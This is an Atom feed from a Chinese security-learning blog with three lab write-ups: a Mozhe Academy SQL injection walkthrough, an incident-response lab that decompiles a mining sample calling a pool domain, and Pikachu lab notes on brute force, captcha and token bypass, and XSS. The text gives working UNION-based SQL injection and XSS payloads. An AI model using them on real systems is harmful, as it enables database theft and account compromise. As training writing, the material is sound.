@@ -1,0 +1,1631 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://dengdinshan.github.io</id>
+    <title>榴莲酥的碎碎念</title>
+    <updated>2024-11-02T03:56:45.684Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://dengdinshan.github.io"/>
+    <link rel="self" href="https://dengdinshan.github.io/atom.xml"/>
+    <subtitle>天下有情人终成眷属</subtitle>
+    <logo>https://dengdinshan.github.io/images/avatar.png</logo>
+    <icon>https://dengdinshan.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, 榴莲酥的碎碎念</rights>
+    <entry>
+        <title type="html"><![CDATA[墨者学院SQL手工注入漏洞测试(MySQL数据库)]]></title>
+        <id>https://dengdinshan.github.io/post/mo-zhe-xue-yuan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/</id>
+        <link href="https://dengdinshan.github.io/post/mo-zhe-xue-yuan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/">
+        </link>
+        <updated>2024-11-02T03:55:44.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="墨者学院sql手工注入漏洞测试mysql数据库">墨者学院SQL手工注入漏洞测试(MySQL数据库)</h1>
+<p>墨者学院是一个在线靶场</p>
+<p>注册账号之后可以通过支付墨币来进行购买靶场进行使用</p>
+<p>今天来打的是SQL手工注入漏洞测试(MySQL数据库)</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231143571.png" alt="image-20241023114336418" loading="lazy"></figure>
+<p>首先来到了一个登录系统 不论怎么输入什么账号密码 最后都会出现账号密码错误的弹窗 来查看一下源代码</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231158408.png" alt="image-20241023115836342" loading="lazy"></figure>
+<p>发现还有一个链接</p>
+<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231158650.png" alt="image-20241023115855609" style="zoom:150%;" />
+<p>查看原网页</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231159290.png" alt="image-20241023115919240" loading="lazy"></figure>
+<p>找到注入点了</p>
+<h2 id="1判断注入点">1.判断注入点</h2>
+<p>开始注入</p>
+<p>http://124.70.64.48:45912/new_list.php?id=1 and 1=1</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231201638.png" alt="image-20241023120114587" loading="lazy"></figure>
+<p>http://124.70.64.48:45912/new_list.php?id=1%20and%201=2</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231201808.png" alt="image-20241023120136769" loading="lazy"></figure>
+<p>老规矩抛出and 1=1 和 and 1=2测试，发现1=1页面正常，1=2报错了,所以是数字型注入。</p>
+<h2 id="2爆字段个数">2.爆字段个数</h2>
+<p>注入语句为<code>id=1 order by 1</code> 数字1逐次提升发现是5报错。说明字段数为4<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231207879.png" alt="image-20241023120753826" loading="lazy"></p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231208243.png" alt="image-20241023120828203" loading="lazy"></figure>
+<h2 id="3爆显位位置">3.爆显位位置</h2>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231535290.png" alt="image-20241023153517219" loading="lazy"></figure>
+<p>注入语句为`id=-1 union select 1,2,3,4至于为什么这里id变成-1了，其实是为了让数据库查询不到信息而返回错误，来巧妙返回我们的注入语句。</p>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231535340.png" alt="image-20241023153542302" loading="lazy"></figure>
+<p>发现显位位置是2，3</p>
+<h2 id="4爆数据库名-版本-用户等等">4.爆数据库名、版本、用户等等</h2>
+<p>注入语句为id=-1 union select 1,user(),database(),4<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231538378.png" alt="image-20241023153825335" loading="lazy"></p>
+<p>得到用户是root，数据库名是mozhe_Discuz_StormGroup</p>
+<h2 id="5爆数据库表名">5.爆数据库表名</h2>
+<p>注入语句为</p>
+<p>id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</p>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231635383.png" alt="image-20241023163507316" loading="lazy"></figure>
+<h2 id="6爆数据库列名">6.爆数据库列名</h2>
+<p>注入语句为</p>
+<p>id=-1 union select 1,group_concat(column_name) ,3,4 from information_schema.columns where table_schema=database() and table_name=&quot;StormGroup_member&quot;</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231636348.png" alt="image-20241023163636269" loading="lazy"></figure>
+<p>得到四个列名id,name,password,status</p>
+<p>明显name和password可疑</p>
+<p>7.爆数据库数据</p>
+<p>注入语句为</p>
+<p>id=-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231729991.png" alt="image-20241023172917938" loading="lazy"></figure>
+<p>发现密码是一串MD5，去MD5解码网站https://www.cmd5.com/?lailu=www.itdka.cn</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231729131.png" alt="image-20241023172952088" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231741559.png" alt="image-20241023173110520" loading="lazy"></figure>
+<p>dsan13  391454</p>
+<p>登录发现第一个失效了</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231736294.png" alt="image-20241023173653213" loading="lazy"></figure>
+<p>使用第二个登录成功 拿到key</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231741105.png" alt="image-20241023174140006" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[知攻善防应急响应靶机训练-Web1]]></title>
+        <id>https://dengdinshan.github.io/post/zhi-gong-shan-fang-ying-ji-xiang-ying-ba-ji-xun-lian-web1/</id>
+        <link href="https://dengdinshan.github.io/post/zhi-gong-shan-fang-ying-ji-xiang-ying-ba-ji-xun-lian-web1/">
+        </link>
+        <updated>2024-10-23T03:33:28.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="知攻善防应急响应靶机训练-web1">知攻善防应急响应靶机训练-Web1</h1>
+<p>本次<a href="https://so.csdn.net/so/search?q=%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&amp;spm=1001.2101.3001.7020">应急响应</a>靶机采用的是知攻善防实验室的Web-1应急响应靶机 靶机下载地址为： https://pan.quark.cn/s/4b6dffd0c51a</p>
+<p>首先是将靶机导入虚拟机</p>
+<p>如果直接导入 将会有版本不适配的弹窗 解决办法是在虚拟机文件中找到</p>
+<figure data-type="image" tabindex="1"><img src="C:/Users/613/AppData/Roaming/Typora/typora-user-images/image-20241023095721237.png" alt="image-20241023095721237" loading="lazy"></figure>
+<p>.vmx格式的文件 使用记事本打开 修改其中的版本为自己的vmware版本即可正常打开</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410230959897.png" alt="image-20241023095958855" loading="lazy"></figure>
+<p>打开虚拟机</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231001148.png" alt="image-20241023100124939" loading="lazy"></figure>
+<p>发现有phpstudy 打开看看</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231003495.png" alt="image-20241023100312438" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231037765.png" alt="image-20241023103727456" loading="lazy"></figure>
+<p>在服务器上上传应急响应工具</p>
+<p>使用d盾</p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231039943.png" alt="image-20241023103944888" loading="lazy"></figure>
+<p>发现了<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231042921.png" alt="image-20241023104242886" loading="lazy"></p>
+<p>读取一下shell信息</p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231046963.png" alt="image-20241023104624912" loading="lazy"></figure>
+<p>找到shell连接密码，并进行解密，发现为默认冰蝎密码rebeyond</p>
+<p>回到PHP study中，找到Apache的日志文件</p>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231048672.png" alt="image-20241023104830624" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231048419.png" alt="image-20241023104816372" loading="lazy"></figure>
+<p>查看日志文件</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231049506.png" alt="image-20241023104922448" loading="lazy"></figure>
+<p>使用查找 发现有大量爆破行为 猜测存在弱口令<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231051834.png" alt="image-20241023105109786" loading="lazy"></p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231053189.png" alt="image-20241023105322141" loading="lazy"></figure>
+<p>攻击者ip为192.168.126.1</p>
+<p>使用Windows日志一键分析功能</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231054992.png" alt="image-20241023105413944" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231055717.png" alt="image-20241023105514670" loading="lazy"></figure>
+<p>发现未知用户名hack168$<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231055269.png" alt="image-20241023105539229" loading="lazy"></p>
+<p>找到该用户文件夹位置，寻找蛛丝马迹</p>
+<p>C:\Users\hack168$</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231056507.png" alt="image-20241023105631462" loading="lazy"></figure>
+<p>在桌面找到程序kuang.exe</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231057538.png" alt="image-20241023105752500" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231058330.png" alt="image-20241023105821279" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231058931.png" alt="image-20241023105833827" loading="lazy"></figure>
+<p>系统直接崩溃</p>
+<p>判别为挖矿程序，进行分析 分析该文件</p>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231101710.png" alt="image-20241023110143623" loading="lazy"></figure>
+<p>该挖矿程序为pyinstaller打包，使用pyinstxtractor进行反编译</p>
+<p>工具下载地址：<a href="https://github.com/extremecoders-re/pyinstxtractor">GitHub - extremecoders-re/pyinstxtractor: PyInstaller Extractor</a></p>
+<p>命令为：</p>
+<p>python pyinstxtractor.py C:\Users\hack168$\Desktop\Kuang.exe</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231102601.png" alt="image-20241023110238548" loading="lazy"></figure>
+<p>得到pyc文件</p>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231103995.png" alt="image-20241023110301943" loading="lazy"></figure>
+<p>得到了kuang的pyc文件</p>
+<p>使用在线pyc反编译工具</p>
+<p>附上两个地址   1   https://www.lddgo.net/string/pyc-compile-decompile</p>
+<p>​    2    https://toolkk.com/tools/pyc-decomplie</p>
+<p>得到源码</p>
+<p>Visit https://www.lddgo.net/string/pyc-compile-decompile for more information # Version : Python 3.8 import multiprocessing import requests def cpu_intensive_task(): try: requests.get('http://wakuang.zhigongshanfang.top', 10, **('timeout',)) finally: continue continue continue if <strong>name</strong> == '<strong>main</strong>': cpu_count = multiprocessing.cpu_count() processes = (lambda .0: [ multiprocessing.Process(cpu_intensive_task, **('target',)) for _ in .0 ])(range(cpu_count)) for process in processes: process.start() for process in processes: process.join()</p>
+<p>得到了矿池域名http://wakuang.zhigongshanfang.top</p>
+<p>解题答案</p>
+<p>shell密码：rebeyond</p>
+<p>攻击者ip地址 192.168.126.1</p>
+<p>攻击者隐藏账户名称:hack168</p>
+<p>矿池域名:wakuang.zhigongshanfang.top</p>
+<p><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231130397.png" alt="image-20241023113021353" loading="lazy"><br>
+总结<br>
+第一次做应急响应的靶场 思路和渗透测试的时候恰恰相反 需要从各种方面去分析寻找答案</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PIKACHU靶场]]></title>
+        <id>https://dengdinshan.github.io/post/pikachu-ba-chang/</id>
+        <link href="https://dengdinshan.github.io/post/pikachu-ba-chang/">
+        </link>
+        <updated>2024-10-17T07:35:40.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="pikachu">pikachu</h1>
+<h2 id="burte-force暴力破解概述">Burte Force（暴力破解）概述</h2>
+<p>​            “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。            其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。            为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
+<p>​            理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。            我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。            这里的认证安全策略, 包括：</p>
+<p>​            1.是否要求用户设置复杂的密码；<br>
+​            2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>
+​            3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>
+​            4.是否采用了双因素认证；<br>
+​            ...等等。<br>
+​             千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!</p>
+<p>首先是基于表单的暴力破解 简简单单直接抓包放入intruder就行</p>
+<p>得到账号admin密码123456</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252338.png" alt="image-20240728113017945" loading="lazy"></figure>
+<h3 id="来到第二关-验证码绕过">来到第二关 验证码绕过</h3>
+<p>通过重新发包 发现验证码在页面未刷新的情况下 不会更改</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252347.png" alt="image-20240728113518058" loading="lazy"></figure>
+<p>对其进行爆破得到</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252341.png" alt="image-20240728113718089" loading="lazy"></figure>
+<h3 id="第三关验证码绕过">第三关验证码绕过</h3>
+<p>先测试验证码 发现其功能点仅仅处于前端 因为点击验证码刷新的时候 没有数据的传输 未能抓得到包</p>
+<p>直接禁用JavaScript 验证码直接消失</p>
+<p>对其进行抓包爆破 得到账号密码</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252339.png" alt="image-20240728114157360" loading="lazy"></figure>
+<p>也可以通过查看网页源代码</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252343.png" alt="image-20240728114454974" loading="lazy"></figure>
+<p>发现验证码存在网页前端</p>
+<h3 id="最后一关-token防爆破">最后一关 token防爆破</h3>
+<p>首先了解token是什么</p>
+<p>&quot;token&quot;通常指的是一个用于验证用户身份和授权访问的令牌。它是一种特殊的字符串或代码，由服务器生成并分配给经过身份验证的用户。用户在成功登录后，服务器会颁发一个token给客户端（例如Web浏览器），客户端将在随后的请求中将该token作为身份验证凭据发送给服务器。</p>
+<p>这关的题目说了有token 那就我们先来查看源代码</p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252342.png" alt="image-20240728115156557" loading="lazy"></figure>
+<p>能够发现在登录框的下面 有着这一登录验证的token</p>
+<p>对于有token的的验证，我们适用于已经知道账号的情况，或者账号和密码一一对应的情况，并且我们的暴力破解方式就要有所调整，我们依旧是先抓包，并发送到攻击模块</p>
+<p>我们这里的攻击目标要选择password，以及token，攻击方式选择Pitchfork</p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252831.png" alt="image-20240728115820501" loading="lazy"></figure>
+<p>下面我们来到payloads模块，password设置和之前一样，上传我们的爆破字典即可，第二个位置token处进行如下设置，我们首先来到Options模块 找到提取栏目</p>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252858.png" alt="image-20240728121158794" loading="lazy"></figure>
+<p>首先获取相应</p>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252884.png" alt="image-20240728121303679" loading="lazy"></figure>
+<p>然后在数据包中找到token</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252915.png" alt="image-20240728121435692" loading="lazy"></figure>
+<p>再回到payloads模块，前两个位置和前几关一样，正常选择字典即可，第二个位置选择Secursive grep（递归搜索），并且将我们刚刚复制的token粘贴到下面的框里，开始攻击即可。</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252941.png" alt="image-20240728121801712" loading="lazy"></figure>
+<p>遇到以下提示</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252041.png" alt="image-20240728121831106" loading="lazy"></figure>
+<p>我们来到resource pool模块，选择创建新的资源池，并把最大请求数改为1</p>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252222.png" alt="image-20240728122001856" loading="lazy"></figure>
+<p>开始攻击 得到</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252249.png" alt="image-20240728122037114" loading="lazy"></figure>
+<p>成功了</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252331.png" alt="image-20240728122210610" loading="lazy"></figure>
+<h2 id="cross-site-scriptingxss">Cross-Site Scripting（xss）</h2>
+<h3 id="xss跨站脚本概述">XSS（跨站脚本）概述</h3>
+<p>​                        Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>
+​                          1.反射性XSS;<br>
+​                          2.存储型XSS;<br>
+​                          3.DOM型XSS;<br>
+​</p>
+<p>​                        XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>
+​                        XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>
+​                        形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>
+​                        因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>
+​                         输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>
+​                         输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252477.png" alt="image-20240728125805813" loading="lazy"></figure>
+<h4 id="跨站脚本漏洞类型及测试流程">跨站脚本漏洞类型及测试流程</h4>
+<p>跨站脚本漏洞常见类型<br>
+反射型<br>
+交互的数据一般不会被存在数据库里面，一次性，一般出现在查询类等页面。<br>
+存储型<br>
+交互的数据被存储在数据库里，永久性存储，一般出现在留言板，注册类等页面。<br>
+DOM型<br>
+不与后台服务器产生数据交互，通过DOM操作前端代码 输出的时候产生的问题，一次性，也属于反射型。</p>
+<h5 id="xss漏洞形成的原因">XSS漏洞形成的原因：</h5>
+<p>主要原因是程序对输入和输出控制不够严格，导致“精心构造”的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行而产生的危害。</p>
+<h5 id="跨站脚本漏洞测试流程">跨站脚本漏洞测试流程</h5>
+<p>在目标站点找到输入点，比如查询接口，留言板等；<br>
+输入一组“特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理。<br>
+通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行JS代码的条件（构造闭合）；<br>
+提交payload，成功执行则存在xss漏洞。</p>
+<h6 id="tips">tips</h6>
+<ol>
+<li>一般查询接口易出现反射型xss，留言板易出现存储型xss。</li>
+<li>后台可能存在过滤措施，构造的script可能会被过滤掉，从而无法生效。</li>
+<li>通过变化不同的script，尝试绕过后台过滤机制。</li>
+</ol>
+<h3 id="反射型xssget">反射型xss(get)</h3>
+<p>首先尝试使用最简单的payload  <script>alert(1)</script>发现输入框对于输入的字段做了限制</p>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252551.png" alt="image-20240728130445309" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252573.png" alt="image-20240728130529581" loading="lazy"></figure>
+<p>将可输入长度变为100  补充完语句 即可触发弹窗</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252606.png" alt="image-20240728130639701" loading="lazy"></figure>
+<h3 id="反射型xsspost">反射型XSS（post）</h3>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252634.png" alt="image-20240728131710430" loading="lazy"></figure>
+<p>通过提示可以得到账号密码进行登录</p>
+<figure data-type="image" tabindex="21"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252664.png" alt="image-20240728131749181" loading="lazy"></figure>
+<p>有框就试试<script>alert(1)</script></p>
+<figure data-type="image" tabindex="22"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252947.png" alt="image-20240728131832673" loading="lazy"></figure>
+<p>点击提交可以发现注入成功</p>
+<h4 id="反射型xssget和xsspost区别">反射型xss(get)和xss(post)区别：</h4>
+<p><strong>get型提交的数据会显示在url中，而post不会。</strong></p>
+<figure data-type="image" tabindex="23"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252970.png" alt="image-20240728131631582" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252009.png" alt="image-20240728131823219" loading="lazy"></figure>
+<h3 id="存储型xss">存储型xss</h3>
+<figure data-type="image" tabindex="25"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252034.png" alt="image-20240728132744351" loading="lazy"></figure>
+<p>对于留言板直接进行payload插入</p>
+<figure data-type="image" tabindex="26"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252066.png" alt="image-20240728132851016" loading="lazy"></figure>
+<p>在留言板中输入Do you love me？</p>
+<figure data-type="image" tabindex="27"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252088.png" alt="image-20240728133037558" loading="lazy"></figure>
+<p>点击确定我们依然会看到出现弹窗，而且我们可以看到留言列表发现进行了存储。</p>
+<p>不仅如此，我们进行页面切换，然后再次切换回来，发现弹窗依然存在，说明我们输入的语句已经被存储起来。</p>
+<figure data-type="image" tabindex="28"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252320.png" alt="image-20240728133202069" loading="lazy"></figure>
+<p>这就是存储性与反射性永久性和一次性的区别，会永久的存储在数据库中。</p>
+<h3 id="dom型xss">DOM型XSS</h3>
+<p>讲到这里，我们就应该去了解什么是dom 在html中 dom可以以一个树状图表示出来</p>
+<figure data-type="image" tabindex="29"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252350.png" alt="image-20240729152207692" loading="lazy"></figure>
+<p>通过JavaScript,可以重构整个HTML文档。您可以添加、移除、改变或重排页面上的项目。要改变页面的某个东西，JavaScript就需要获得对HTML文档中所有元素进行访问的入口。这个入口，连同对HTML元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的(DOM)所以，你可以把DOM理解为JS访问HTML的标准编程接口。DOM是纯前端的操作<br>
+首先我们对输入框进行测试</p>
+<p>输入122333</p>
+<figure data-type="image" tabindex="30"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252382.png" alt="image-20240729183033680" loading="lazy"></figure>
+<p>查看网页源码可以发现  ctrl+f搜索 what do you see 定位。</p>
+<figure data-type="image" tabindex="31"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252416.png" alt="image-20240729184549384" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252437.png" alt="image-20240729183856429" loading="lazy"></figure>
+<p>我们输入框中的内容就是标注的str，我们可以在这里构造一个闭合，实现弹窗</p>
+<p>原句是 <code>&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;</code></p>
+<p>为了实现闭合语句 我们将要在输入框中输入的是  ' onclick=&quot;alert('xss')&quot;&gt;</p>
+<p>构造之后的完成语句：<br>
+<code>&lt;a href='' onclick=&quot;alert(‘xss’)&quot;&gt;'&gt;what do you see?&lt;/a&gt;</code></p>
+<figure data-type="image" tabindex="33"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252530.png" alt="image-20240729195947531" loading="lazy"></figure>
+<p>点击'&gt;what do you see?  即可触发弹窗</p>
+<figure data-type="image" tabindex="34"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252570.png" alt="image-20240729200134493" loading="lazy"></figure>
+<h3 id="dom型xss-x">DOM型xss-x</h3>
+<p>首先我们先查看源代码</p>
+<figure data-type="image" tabindex="35"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252770.png" alt="image-20240729200354050" loading="lazy"></figure>
+<p>与上一关的区别就是这次是从url中获取我们输入的text参数的，这就类似反射型，其他都是一样，构造语句 ' onclick=&quot;alert(1)&quot;&gt; 实现闭合即可。</p>
+<figure data-type="image" tabindex="36"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252812.png" alt="image-20240729200735518" loading="lazy"></figure>
+<p>发现还可以点击 继续点击就行了</p>
+<figure data-type="image" tabindex="37"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252842.png" alt="image-20240729200801474" loading="lazy"></figure>
+<h3 id="xss盲打">xss盲打</h3>
+<p>什么是xss盲打呢</p>
+<p>盲打也就是我们在前端并不能看到我们的代码，无法判断xss是否成功，只有在后台才能看到</p>
+<p>老规矩 先查看网页源代码 发现一无所获</p>
+<figure data-type="image" tabindex="38"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252872.png" alt="image-20240729201007461" loading="lazy"></figure>
+<p>我们直接构造payload  <script>alert(1)</script></p>
+<figure data-type="image" tabindex="39"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252929.png" alt="image-20240729201223276" loading="lazy"></figure>
+<p>点击提交 发现没有任何反馈</p>
+<figure data-type="image" tabindex="40"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252067.png" alt="image-20240729201258407" loading="lazy"></figure>
+<p>根据提示能够发现 有一个后台的登录地址</p>
+<figure data-type="image" tabindex="41"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252100.png" alt="image-20240729201623026" loading="lazy"></figure>
+<p>拼接路径 进入后台登录界面 点击提示能够看到后台的登录账号密码</p>
+<p>点击登录 页面就出现了弹窗</p>
+<figure data-type="image" tabindex="42"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252149.png" alt="image-20240729201853647" loading="lazy"></figure>
